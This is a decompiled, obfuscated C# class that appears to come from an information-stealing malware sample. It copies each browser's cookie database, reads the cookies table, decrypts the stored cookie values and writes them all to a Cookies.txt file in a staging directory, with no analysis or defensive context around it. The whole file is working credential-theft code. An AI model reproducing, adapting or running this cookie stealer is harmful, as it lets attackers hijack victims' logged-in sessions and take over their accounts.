using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using who;

// Token: 0x02000039 RID: 57
internal class Class20
{
	// Token: 0x060001CB RID: 459 RVA: 0x0000E964 File Offset: 0x0000CB64
	public static void smethod_0()
	{
		string text = "";
		List<Class21> list = Class20.smethod_1();
		foreach (Class21 @class in list)
		{
			text += @class.ToString();
		}
		if (text != "")
		{
			if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
			{
				Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
			}
			File.WriteAllText(Dirs.WorkDir + "\\Cookies.txt", text, Encoding.Default);
		}
	}

	// Token: 0x060001CC RID: 460 RVA: 0x0000EA1C File Offset: 0x0000CC1C
	public static List<Class21> smethod_1()
	{
		List<Class21> list = new List<Class21>();
		foreach (string string_ in Dirs.BrowsCookies)
		{
			List<Class21> list2 = Class20.smethod_2(string_);
			if (list2 != null)
			{
				list.AddRange(list2);
			}
		}
		return list;
	}

	// Token: 0x060001CD RID: 461 RVA: 0x0000EA64 File Offset: 0x0000CC64
	private static List<Class21> smethod_2(string string_0)
	{
		List<Class21> result;
		if (!File.Exists(string_0))
		{
			result = null;
		}
		else
		{
			try
			{
				string text = Dirs.WorkDir + "test.fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				Class12 @class = new Class12(text);
				List<Class21> list = new List<Class21>();
				@class.method_4("cookies");
				for (int i = 0; i < @class.method_1(); i++)
				{
					try
					{
						string text2 = string.Empty;
						try
						{
							text2 = Encoding.UTF8.GetString(Class26.smethod_1(Encoding.Default.GetBytes(@class.method_0(i, 12)), null));
						}
						catch
						{
						}
						if (text2 != "")
						{
							List<Class21> list2 = list;
							Class21 class2 = new Class21();
							class2.method_1(@class.method_0(i, 1));
							class2.name = @class.method_0(i, 2);
							class2.path = @class.method_0(i, 4);
							class2.method_3(@class.method_0(i, 5));
							class2.method_5(@class.method_0(i, 6));
							class2.value = text2;
							list2.Add(class2);
							Class20.int_0++;
						}
					}
					catch
					{
					}
				}
				File.Delete(text);
				result = list;
			}
			catch
			{
				result = null;
			}
		}
		return result;
	}

	// Token: 0x060001CE RID: 462 RVA: 0x0000276F File Offset: 0x0000096F
	public Class20()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x040000CA RID: 202
	public static int int_0;
}
